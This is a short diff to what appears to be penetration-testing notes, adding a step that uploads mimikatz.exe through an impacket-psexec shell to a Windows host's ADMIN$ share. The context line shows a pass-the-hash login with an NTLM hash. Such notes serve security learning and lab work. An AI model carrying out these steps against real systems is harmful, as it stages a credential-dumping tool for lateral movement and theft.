@@ -402,4 +402,14 @@ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:57c5a5bc7c0e1f98e9c9d81
 
 <img width="1339" height="400" alt="image" src="https://github.com/user-attachments/assets/5c37d770-99bc-4ffb-8f34-a5e5804d71c6" />
 
+- Transfer files=:
+
+```bash
+C:\Windows\system32> lput mimikatz.exe
+[*] Uploading mimikatz.exe to ADMIN$\/
+C:\Windows\system32> cd C:\windows
+C:\Windows> dir /b mimikatz.exe
+mimikatz.exe
+```
+
 -----------------
